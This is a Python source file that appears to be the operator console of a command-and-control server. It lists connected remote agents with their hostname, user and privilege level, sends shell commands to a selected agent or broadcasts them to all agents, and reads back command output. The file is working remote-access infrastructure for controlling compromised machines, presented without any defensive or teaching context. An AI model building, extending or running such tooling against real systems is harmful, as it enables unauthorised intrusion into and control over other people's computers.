
import json
from c2.server.session import SessionRegistry
from c2.server.protocol import exec_request
from c2.server.transport import send_message

class CLI:
    def __init__(self, registry: SessionRegistry, logger, log_file: str):
        self.reg = registry
        self.logger = logger
        self.log_file = log_file
        self.selected_uuid = None
        self.running = True

    def print_help(self):
        print("""Available commands:
  help                     Show this help
  list                     List connected agents
  select <short_id>        Select agent by short id prefix
  info                     Show info of selected agent
  send <command>           Send shell command to selected agent
  broadcast <command>      Send shell command to all agents
  read <short_id>          Read next incoming message for agent (non-blocking)
  logs [n]                 Show last n lines from server.log (default 50)
  quit                     Shutdown server
""")

    def list_agents(self):
        agents = self.reg.list().values()
        if not agents:
            print("No agents connected.")
            return
        print(f"{'ShortID':10} {'Addr':22} {'Hostname':20} {'OS':15} {'User':15} {'Priv':7} {'PID':6} {'Connected'}")
        for a in agents:
            info = a.info.summary()
            print(f"{a.short:10} {info['addr']:22} {str(info['hostname'])[0:19]:20} {str(info['os'])[0:14]:15} {str(info['username']):15} {str(info['privilege']):7} {str(info['pid']):6} {info['connected_at']}")

    def select_agent(self, short_prefix: str):
        a = self.reg.get_by_short_prefix(short_prefix)
        if not a:
            print("Agent not found by that short id.")
            return
        self.selected_uuid = a.info.uuid
        print(f"Selected agent {a.short} ({a.info.hostname})")

    def show_selected_info(self):
        if not self.selected_uuid:
            print("No agent selected.")
            return
        a = self.reg.get(self.selected_uuid)
        if not a:
            print("Selected agent disconnected.")
            self.selected_uuid = None
            return
        print(json.dumps(a.info.summary(), indent=2, ensure_ascii=False))

    def send_command(self, cmd: str):
        if not self.selected_uuid:
            print("No agent selected.")
            return
        a = self.reg.get(self.selected_uuid)
        if not a:
            print("Selected agent disconnected.")
            self.selected_uuid = None
            return
        payload = exec_request(cmd)
        try:
            with a.lock:
                send_message(a.conn, payload)
            print(f"Sent command to {a.short}")
            self.logger.info("Command sent to %s: %s", a.short, cmd)
        except Exception as e:
            self.logger.exception("Failed to send command to %s: %s", a.short, e)
            print("Failed to send command.")

    def broadcast(self, cmd: str):
        agents = list(self.reg.list().values())
        if not agents:
            print("No agents to broadcast to.")
            return
        for a in agents:
            try:
                with a.lock:
                    send_message(a.conn, exec_request(cmd))
                self.logger.info("Broadcast command to %s: %s", a.short, cmd)
            except Exception as e:
                self.logger.exception("Broadcast failed to %s: %s", a.short, e)
        print("Broadcast sent.")

    def read_incoming(self, short_prefix: str):
        a = self.reg.get_by_short_prefix(short_prefix)
        if not a:
            print("Agent not found.")
            return
        try:
            msg = a.inbox.get_nowait()
        except Exception:
            print("No pending messages for that agent.")
            return
        print("Message:")
        print(json.dumps(msg, indent=2, ensure_ascii=False))
        if msg.get("type") == "exec_result":
            p = msg.get("payload", {})
            print("--- STDOUT ---")
            print(p.get("stdout", ""))
            print("--- STDERR ---")
            print(p.get("stderr", ""))
            print("--------------")

    def show_logs(self, n: int = 50):
        try:
            with open(self.log_file, "r", encoding="utf-8") as fh:
                lines = fh.readlines()
            for line in lines[-n:]:
                print(line.rstrip())
        except Exception as e:
            print("Failed to read logs:", e)
